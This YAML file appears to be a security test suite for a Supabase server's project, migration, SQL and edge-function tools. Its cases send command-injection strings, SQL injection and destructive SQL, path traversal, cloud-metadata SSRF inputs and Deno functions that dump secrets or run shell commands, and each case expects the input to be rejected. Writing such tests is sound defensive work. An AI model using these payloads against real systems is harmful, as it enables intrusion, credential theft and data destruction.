metadata:
    version: "1.0"
    target: supabase test server
    focus: Critical security vulnerabilities
tests:
    - test_id: SEC-001
      name: Command Injection via Project Name
      purpose: "Tests if the project name parameter is vulnerable to command injection attacks.\nIf exploited, an attacker could execute arbitrary system commands on the server,\npotentially leading to complete system compromise, data exfiltration, or \ndenial of service. The name field is user-controlled and may be passed to\nshell commands or system APIs without proper sanitization.\n"
      prerequisites:
        - description: Obtain valid organization_id from list_organizations or user configuration
          variable: VALID_ORG_ID
        - description: Obtain valid cost confirmation ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-001-A
          description: Command injection using shell metacharacters in project name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test; whoami; echo
                organization_id: ${VALID_ORG_ID}
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - root|ubuntu|admin|postgres
                - /home/[a-zA-Z0-9_-]+
                - uid=[0-9]+\(.*?\)
            result: null
        - case_id: SEC-001-B
          description: Command injection using backticks for command substitution
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test`id`project
                organization_id: ${VALID_ORG_ID}
                region: eu-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - uid=[0-9]+\(.*?\)
                - gid=[0-9]+\(.*?\)
            result: null
        - case_id: SEC-001-C
          description: Command injection using pipe operator
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: myproject | cat /etc/passwd
                organization_id: ${VALID_ORG_ID}
                region: ap-south-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - daemon:.*:/usr/sbin
            result: null
    - test_id: SEC-002
      name: Cross-Organization Resource Access
      purpose: |
        Tests for authorization bypass vulnerabilities where an attacker could
        create projects in organizations they don't have access to. This could
        lead to unauthorized resource consumption, cost attribution to wrong
        organizations, or gaining access to isolated tenant environments.
        Successful exploitation would indicate broken access control mechanisms.
      prerequisites:
        - description: Obtain organization_id of another user/tenant that the current user should NOT have access to
          variable: UNAUTHORIZED_ORG_ID
        - description: Obtain valid cost confirmation ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to create project in unauthorized organization
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: unauthorized-project
                organization_id: ${UNAUTHORIZED_ORG_ID}
                region: us-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - 401
            error_response_must_not_match_regex:
                - project_id
                - '"status":\s*"ACTIVE"'
            result: null
        - case_id: SEC-002-B
          description: Attempt to use invalid UUID format for organization_id
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-project
                organization_id: 00000000-0000-0000-0000-000000000000
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - 422
                - -32602
            result: null
        - case_id: SEC-002-C
          description: Attempt SQL injection in organization_id to bypass authorization
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test-project
                organization_id: ''' OR ''1''=''1'
                region: eu-central-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - 422
                - -32602
            result: null
    - test_id: SEC-003
      name: Cost Confirmation Bypass and Manipulation
      purpose: |
        Tests if the cost confirmation mechanism can be bypassed or manipulated
        to create unauthorized projects without proper cost approval. This could
        lead to resource abuse, unexpected billing, or circumvention of spending
        controls. Attackers could create expensive projects without going through
        the proper cost acknowledgment flow.
      prerequisites:
        - description: Obtain valid organization_id from list_organizations
          variable: VALID_ORG_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to create project with invalid cost confirmation ID
          input:
            tool: create_project
            arguments:
                confirm_cost_id: invalid-cost-id-12345
                name: bypass-cost-project
                organization_id: ${VALID_ORG_ID}
                region: us-east-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
        - case_id: SEC-003-B
          description: Attempt to reuse expired or already-used cost confirmation ID
          input:
            tool: create_project
            arguments:
                confirm_cost_id: 00000000-0000-0000-0000-000000000000
                name: reuse-cost-project
                organization_id: ${VALID_ORG_ID}
                region: ap-southeast-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            result: null
        - case_id: SEC-003-C
          description: Attempt SQL injection in cost confirmation ID
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ''' OR 1=1--'
                name: inject-cost-project
                organization_id: ${VALID_ORG_ID}
                region: ca-central-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error responses leak sensitive information such as internal
        paths, database details, API keys, tokens, or system configuration.
        Information disclosure can aid attackers in reconnaissance and planning
        more sophisticated attacks. Error messages should be generic and not
        reveal internal implementation details.
      prerequisites:
        - description: Obtain valid organization_id from list_organizations
          variable: VALID_ORG_ID
        - description: Obtain valid cost confirmation ID from confirm_cost tool
          variable: VALID_COST_ID
      test_cases:
        - case_id: SEC-004-A
          description: Test for stack trace or internal path disclosure with malformed name
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: <script>alert(document.cookie)</script>
                organization_id: ${VALID_ORG_ID}
                region: us-west-1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /var/www/|/usr/local/|/home/|C:\\[Pp]rogram
                - at [a-zA-Z]+\.[a-zA-Z]+\([^)]+:[0-9]+:[0-9]+\)
                - Traceback|Stack trace
                - Bearer [a-zA-Z0-9_-]{20,}
                - 'postgres://.*@.*:'
                - password["']?:\s*["'][^"']{8,}
            result: null
        - case_id: SEC-004-B
          description: Test for database error disclosure with SQL injection pattern
          input:
            tool: create_project
            arguments:
                confirm_cost_id: ${VALID_COST_ID}
                name: test'; DROP TABLE projects; --
                organization_id: ${VALID_ORG_ID}
                region: eu-west-2
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - PostgreSQL|MySQL|SQLSTATE
                - syntax error at or near
                - pg_|information_schema
                - database connection|db_host|db_port
            result: null
    - test_id: SEC-001
      name: Unauthorized Project Access via Invalid Project ID
      purpose: |
        Tests if the pause_project tool properly validates project ownership and authorization.
        Attackers could attempt to pause projects they don't own by guessing or enumerating
        project IDs, causing service disruption to other users' projects.
        Impact: Denial of service, unauthorized control over other users' infrastructure.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to pause project with non-existent UUID
          input:
            tool: pause_project
            arguments:
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - api[_-]?key["']?\s*[:=]\s*["']?[a-zA-Z0-9]{20,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to pause project with another user's project ID
          input:
            tool: pause_project
            arguments:
                project_id: 99999999-9999-9999-9999-999999999999
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - postgres://[^\s]+:[^\s]+@
                - password["']?\s*[:=]\s*["']?[^\s"']{8,}
            result: null
    - test_id: SEC-002
      name: SQL Injection in Project ID Parameter
      purpose: |
        Tests if the project_id parameter is vulnerable to SQL injection attacks.
        If the project_id is directly interpolated into SQL queries without proper
        sanitization, attackers could extract sensitive data or manipulate database operations.
        Impact: Data breach, unauthorized data access, potential database compromise.
      test_cases:
        - case_id: SEC-002-A
          description: Basic SQL injection with quote escape attempt
          input:
            tool: pause_project
            arguments:
                project_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error.*position
                - (?i)unterminated quoted string
                - (?i)invalid input syntax
            result: null
        - case_id: SEC-002-B
          description: SQL injection with UNION-based attack
          input:
            tool: pause_project
            arguments:
                project_id: 123' UNION SELECT api_key FROM api_keys WHERE '1'='1
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - '[a-f0-9]{32,64}'
                - sb[a-z]{2,}_[a-zA-Z0-9]{20,}
            result: null
        - case_id: SEC-002-C
          description: SQL injection with comment-based bypass
          input:
            tool: pause_project
            arguments:
                project_id: 123'; DROP TABLE projects; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-003
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages leak sensitive information such as database credentials,
        internal system paths, API keys, or detailed system configuration.
        Attackers use this information to plan more sophisticated attacks.
        Impact: Information leakage enabling further exploitation.
      test_cases:
        - case_id: SEC-003-A
          description: Trigger error with malformed UUID to check for stack trace leakage
          input:
            tool: pause_project
            arguments:
                project_id: not-a-valid-uuid-format-at-all
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /home/[a-zA-Z0-9_-]+/
                - /usr/[a-zA-Z0-9_/-]+/
                - File "[^"]+", line \d+
                - (?i)traceback.*most recent call
                - postgres://[^\s]+
                - (?i)connection string
            result: null
        - case_id: SEC-003-B
          description: Trigger error with special characters to expose internal parsing details
          input:
            tool: pause_project
            arguments:
                project_id: ../../../etc/passwd%00.uuid
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - Authorization:.*[a-zA-Z0-9]{20,}
                - X-API-Key:.*[a-zA-Z0-9]{20,}
                - supabase_api_key["']?\s*[:=]
            result: null
    - test_id: SEC-004
      name: Path Traversal and Code Injection in Project ID
      purpose: |
        Tests if the project_id parameter is vulnerable to path traversal or command injection.
        If the parameter is used in file operations or system commands without sanitization,
        attackers could access unauthorized files or execute arbitrary commands.
        Impact: Remote code execution, unauthorized file access, system compromise.
      test_cases:
        - case_id: SEC-004-A
          description: Path traversal attempt to access sensitive files
          input:
            tool: pause_project
            arguments:
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - bin:.*:/bin/
                - daemon:.*:/usr/sbin
            result: null
        - case_id: SEC-004-B
          description: Command injection attempt in project ID
          input:
            tool: pause_project
            arguments:
                project_id: test; whoami; echo vulnerable
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - (?i)uid=\d+.*gid=\d+
                - vulnerable
            result: null
        - case_id: SEC-004-C
          description: Null byte injection attempt
          input:
            tool: pause_project
            arguments:
                project_id: valid-uuid%00malicious-path
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-001
      name: Unauthorized Project Restoration - Cross-Tenant Access
      purpose: |
        Tests if the restore_project endpoint properly validates project ownership
        and prevents unauthorized users from restoring projects they don't own.
        A successful exploit could allow an attacker to restore another tenant's
        project, potentially causing data loss, service disruption, or exposing
        sensitive project configurations.
      prerequisites:
        - description: Obtain a valid project ID from a different tenant/organization that the current user should not have access to
          variable: OTHER_TENANT_PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to restore project using another tenant's project ID
          input:
            tool: restore_project
            arguments:
                project_id: ${OTHER_TENANT_PROJECT_ID}
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - database.*password
                - api[_-]?key.*[a-zA-Z0-9]{20,}
                - secret[_-]?key.*[a-zA-Z0-9]{20,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to restore project using UUID of non-existent project to probe for information disclosure
          input:
            tool: restore_project
            arguments:
                project_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 404
                - 403
                - -32602
            error_response_must_not_match_regex:
                - internal[_-]?path.*/
                - stack trace
                - at [a-zA-Z]+\.[a-zA-Z]+\(
            result: null
    - test_id: SEC-002
      name: Project ID Injection Attacks
      purpose: |
        Tests if the project_id parameter is properly validated and sanitized
        to prevent injection attacks. Insufficient validation could lead to
        SQL injection, command injection, or path traversal attacks that could
        compromise the underlying infrastructure, expose sensitive data, or
        execute arbitrary code on the server.
      test_cases:
        - case_id: SEC-002-A
          description: SQL injection attempt via project_id parameter
          input:
            tool: restore_project
            arguments:
                project_id: ''' OR ''1''=''1'' -- '
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SQL syntax.*error
                - PostgreSQL.*ERROR
                - SELECT.*FROM.*WHERE
            result: null
        - case_id: SEC-002-B
          description: Command injection attempt via project_id parameter
          input:
            tool: restore_project
            arguments:
                project_id: '; cat /etc/passwd; echo '
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:x:0:0:'
                - /bin/bash
                - '/home/[a-zA-Z0-9_-]+:'
            result: null
        - case_id: SEC-002-C
          description: Path traversal injection via project_id parameter
          input:
            tool: restore_project
            arguments:
                project_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-003
      name: Server-Side Request Forgery (SSRF) via Project ID
      purpose: |
        Tests if the project_id parameter could be exploited to trigger SSRF
        attacks if the backend attempts to fetch resources based on the project_id.
        A successful SSRF attack could allow an attacker to access internal
        network resources, cloud metadata services (AWS, GCP, Azure), or bypass
        firewall restrictions to reach sensitive internal endpoints.
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to access AWS metadata service via project_id
          input:
            tool: restore_project
            arguments:
                project_id: http://169.254.169.254/latest/meta-data/iam/security-credentials/
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - AccessKeyId
                - SecretAccessKey
                - Token.*IAM
            result: null
        - case_id: SEC-003-B
          description: Attempt to access localhost services via project_id
          input:
            tool: restore_project
            arguments:
                project_id: http://127.0.0.1:5432
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages from failed restore attempts leak sensitive
        information such as internal paths, database credentials, API keys,
        system architecture details, or stack traces. Information disclosure
        vulnerabilities can provide attackers with valuable reconnaissance
        data to craft more targeted attacks.
      test_cases:
        - case_id: SEC-004-A
          description: Test for sensitive information in error response with malformed UUID
          input:
            tool: restore_project
            arguments:
                project_id: invalid-uuid-format-test
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - /var/[a-zA-Z0-9_/-]+
                - /home/[a-zA-Z0-9_/-]+
                - at [a-zA-Z]+\.[a-zA-Z]+:\d+
                - Bearer [a-zA-Z0-9_-]{20,}
                - service_role.*key
            result: null
        - case_id: SEC-004-B
          description: Test for database connection strings in error messages
          input:
            tool: restore_project
            arguments:
                project_id: <script>alert('xss')</script>
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 422
                - -32602
            error_response_must_not_match_regex:
                - postgres://[^@]+@[^/]+
                - password=\S+
                - postgresql://.*:[^@]+@
            result: null
    - test_id: SEC-001
      name: SQL Injection via Migration Query Parameter
      purpose: |
        Tests for SQL injection vulnerabilities in the query parameter that could allow
        attackers to execute arbitrary SQL commands, potentially leading to data breaches,
        data destruction, or privilege escalation. The query parameter accepts raw SQL
        and may not properly sanitize or validate malicious payloads.
        Impact: Complete database compromise, data exfiltration, or data destruction.
      prerequisites:
        - description: Valid project ID from Supabase project configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: Attempt SQL injection with comment-based payload to bypass validation
          input:
            tool: apply_migration
            arguments:
                name: test_migration
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE test_table (id INT); --'; DROP TABLE auth.users CASCADE; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - password["']?\s*[:=]\s*["'][^"']{8,}
                - (?i)bearer\s+[a-zA-Z0-9_-]{20,}
                - (?i)secret[_-]?key["']?\s*[:=]\s*["'][^"']{16,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to access sensitive auth schema tables through migration
          input:
            tool: apply_migration
            arguments:
                name: exfil_migration
                project_id: ${VALID_PROJECT_ID}
                query: SELECT * FROM auth.users; COPY (SELECT email, encrypted_password FROM auth.users) TO '/tmp/stolen_data.csv';
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                - \$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}
                - encrypted_password
            result: null
        - case_id: SEC-001-C
          description: Attempt UNION-based SQL injection to extract sensitive data
          input:
            tool: apply_migration
            arguments:
                name: union_attack
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE dummy AS SELECT 1; UNION SELECT email, encrypted_password, raw_app_meta_data FROM auth.users; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
                - \$2[aby]\$\d{2}\$[./A-Za-z0-9]{53}
            result: null
    - test_id: SEC-002
      name: Unauthorized Cross-Project Access
      purpose: |
        Tests whether the tool properly validates project_id authorization, preventing
        attackers from applying migrations to projects they don't own. Insufficient
        authorization checks could allow an attacker to compromise other users' databases.
        Impact: Unauthorized database modification, data destruction across multiple tenants.
      test_cases:
        - case_id: SEC-002-A
          description: Attempt to use non-existent or invalid project ID
          input:
            tool: apply_migration
            arguments:
                name: unauthorized_migration
                project_id: 00000000-0000-0000-0000-000000000000
                query: CREATE TABLE unauthorized_table (id INT);
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - (?i)api[_-]?key["']?\s*[:=]\s*["'][^"']{20,}
                - (?i)access[_-]?token["']?\s*[:=]\s*["'][^"']{20,}
            result: null
        - case_id: SEC-002-B
          description: Attempt SQL injection in project_id parameter
          input:
            tool: apply_migration
            arguments:
                name: injection_test
                project_id: abc123' OR '1'='1
                query: CREATE TABLE test (id INT);
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-003
      name: Dangerous DDL Operations and Privilege Escalation
      purpose: |
        Tests whether the tool restricts dangerous DDL operations that could grant
        excessive privileges, create backdoors, or destroy critical system tables.
        Attackers could use unrestricted DDL to create superuser accounts, drop
        security policies, or modify authentication mechanisms.
        Impact: Complete system compromise, permanent data loss, authentication bypass.
      prerequisites:
        - description: Valid project ID from Supabase project configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-003-A
          description: Attempt to create superuser role with all privileges
          input:
            tool: apply_migration
            arguments:
                name: privilege_escalation
                project_id: ${VALID_PROJECT_ID}
                query: CREATE ROLE attacker_admin WITH SUPERUSER LOGIN PASSWORD 'hacked123'; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker_admin;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - password["']?\s*[:=]\s*["'][^"']{6,}
                - (?i)created.*role.*successfully
            result: null
        - case_id: SEC-003-B
          description: Attempt to drop critical system schema
          input:
            tool: apply_migration
            arguments:
                name: destructive_migration
                project_id: ${VALID_PROJECT_ID}
                query: DROP SCHEMA IF EXISTS auth CASCADE; DROP SCHEMA IF EXISTS storage CASCADE; DROP EXTENSION IF EXISTS pg_stat_statements CASCADE;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-003-C
          description: Attempt to disable row-level security policies
          input:
            tool: apply_migration
            arguments:
                name: disable_security
                project_id: ${VALID_PROJECT_ID}
                query: ALTER TABLE auth.users DISABLE ROW LEVEL SECURITY; DROP POLICY IF EXISTS user_isolation ON auth.users; GRANT SELECT, UPDATE ON auth.users TO anon, authenticated;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-004
      name: Migration Name Path Traversal and Injection
      purpose: |
        Tests whether the migration name parameter is properly validated to prevent
        path traversal attacks or injection that could overwrite system files,
        execute arbitrary code, or cause denial of service through filesystem operations.
        Impact: System file manipulation, code execution, DoS through disk exhaustion.
      prerequisites:
        - description: Valid project ID from Supabase project configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-004-A
          description: Attempt path traversal in migration name to access system directories
          input:
            tool: apply_migration
            arguments:
                name: ../../../etc/passwd
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE safe_table (id INT);
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /home/[a-zA-Z0-9_-]+/
                - /var/lib/
            result: null
        - case_id: SEC-004-B
          description: Attempt command injection via migration name with shell metacharacters
          input:
            tool: apply_migration
            arguments:
                name: test_migration; rm -rf /tmp/*; echo
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE test (id INT);
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            result: null
        - case_id: SEC-004-C
          description: Attempt null byte injection in migration name
          input:
            tool: apply_migration
            arguments:
                name: "valid_migration\0../../etc/shadow"
                project_id: ${VALID_PROJECT_ID}
                query: CREATE TABLE test (id INT);
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            result: null
    - test_id: SEC-001
      name: SQL Injection - Union-Based Data Exfiltration
      purpose: |
        Tests for SQL injection vulnerabilities that could allow attackers to extract
        sensitive data from other tables, including credentials, API keys, or user data.
        If exploitable, attackers could access the entire database regardless of intended
        query scope, leading to complete data breach.
      prerequisites:
        - description: Valid project ID from user configuration
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: Union-based injection to extract data from system tables
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT name FROM users WHERE id = 1 UNION SELECT tablename FROM pg_tables WHERE schemaname = 'public'--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-001-B
          description: Injection attempting to extract authentication credentials
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT id FROM items WHERE category = 'test' UNION SELECT email || ':' || encrypted_password FROM auth.users--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-001-C
          description: Boolean-based blind SQL injection
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT * FROM products WHERE id = 1 AND (SELECT COUNT(*) FROM auth.users) > 0--
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-002
      name: SQL Injection - Destructive Operations
      purpose: |
        Tests for SQL injection allowing destructive database operations such as
        DROP TABLE, DELETE, or ALTER commands. Successful exploitation could lead
        to complete data loss, service disruption, and database corruption requiring
        full restore from backups.
      prerequisites:
        - description: Valid project ID from user configuration
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-002-A
          description: Stacked queries attempting to drop tables
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT id FROM users WHERE name = 'test'; DROP TABLE users; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-002-B
          description: Injection attempting mass data deletion
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: DELETE FROM users WHERE id = 1 OR 1=1; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-002-C
          description: CREATE TABLE injection to test DDL operation blocking
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT 1; CREATE TABLE malicious_table_xyz789 (data TEXT); DROP TABLE malicious_table_xyz789; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-003
      name: Information Disclosure in Error Messages
      purpose: |
        Tests whether error messages expose sensitive information such as database
        schema details, table names, column names, internal paths, or system
        configuration. Such information helps attackers map the database structure
        and craft more targeted attacks.
      prerequisites:
        - description: Valid project ID from user configuration
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-003-A
          description: Malformed SQL to trigger detailed error messages
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT * FROM nonexistent_table_xyz123
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32602
            error_response_must_not_match_regex:
                - at line \d+ character \d+
                - 'HINT:.*DETAIL:'
                - CONTEXT:.*PL/pgSQL
                - /var/lib/postgresql
                - pg_catalog\.
            result: null
        - case_id: SEC-003-B
          description: Type mismatch to expose column type information
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT * FROM users WHERE id = 'invalid_type_string'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 500
                - -32602
            error_response_must_not_match_regex:
                - column "[^"]+" is of type [a-z]+
                - cannot cast type [a-z]+ to [a-z]+
                - 'operator does not exist: [a-z]+'
            result: null
        - case_id: SEC-003-C
          description: Valid query checking response doesn't leak sensitive metadata
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT 1 as test
          expected_output:
            error_present: false
            error_response_must_not_match_regex:
                - Bearer [a-zA-Z0-9_-]{20,}
                - api[_-]?key["']?\s*[:=]\s*["']?[a-zA-Z0-9_-]{20,}
                - postgresql://[^\s]+
                - postgres://[^\s]+
            result: null
    - test_id: SEC-004
      name: Privilege Escalation via System Function Access
      purpose: |
        Tests whether the SQL execution context allows access to PostgreSQL system
        functions and administrative operations that could enable privilege escalation,
        file system access, or database superuser operations. Exploitation could lead
        to complete system compromise beyond the database.
      prerequisites:
        - description: Valid project ID from user configuration
          variable: PROJECT_ID
      test_cases:
        - case_id: SEC-004-A
          description: Attempt to read file system using pg_read_file
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: SELECT pg_read_file('/etc/passwd', 0, 1000)
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-004-B
          description: Attempt to execute system commands via COPY TO PROGRAM
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: COPY (SELECT 'test') TO PROGRAM 'cat /etc/passwd'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
        - case_id: SEC-004-C
          description: Attempt to modify role privileges
          input:
            tool: execute_sql
            arguments:
                project_id: ${PROJECT_ID}
                query: ALTER ROLE postgres WITH SUPERUSER; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO postgres;
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            result: null
    - test_id: SEC-001
      name: Code Injection via Malicious Function Content
      purpose: |
        Tests if arbitrary malicious code can be injected through edge function deployment.
        This is CRITICAL because edge functions execute server-side with access to Supabase
        resources. An attacker could deploy functions that exfiltrate data, access internal
        networks, or compromise the entire project. Impact: Complete system compromise,
        data breach, unauthorized access to backend services.
      prerequisites:
        - description: Valid Supabase project ID from user configuration
          variable: VALID_PROJECT_ID
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to deploy function that reads environment variables and exfiltrates secrets
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: |
                        Deno.serve(async (req: Request) => {
                          const secrets = {
                            env: Deno.env.toObject(),
                            cwd: Deno.cwd(),
                            hostname: Deno.hostname()
                          };
                          await fetch('http://169.254.169.254/latest/meta-data/', {method: 'GET'});
                          return new Response(JSON.stringify(secrets), {
                            headers: {'Content-Type': 'application/json'}
                          });
                        });
                      name: index.ts
                name: malicious_env_exfil
                project_id: ${VALID_PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - SUPABASE_[A-Z_]+.*[=:].*[a-zA-Z0-9_-]{20,}
                - postgresql://[^\s]+
                - apikey["']?\s*[=:]\s*["']?[a-zA-Z0-9_-]{20,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to deploy function with command execution to access internal systems
          input:
            tool: deploy_edge_function
            arguments:
                files:
                    - content: |
                        Deno.serve(async (req: Request) => {
                          const cmd = new Deno.Command('sh', {
                            args: ['-c', 'cat /etc/passwd && curl http://127.0.0.1:8000/admin'],
                            stdout: 'piped',
                            stderr: 'piped'
                          });
                          const output = await cmd.output();
                          return new Response(new TextDecoder().decode(output.stdout));
                        });
                      name: index.ts
                name: malicious_cmd_exec
                project_id: ${VALID_PROJECT_ID}
                verify_jwt: false
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 422
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - /bin/bash
                - /home/[a-zA-Z0-9_-]+
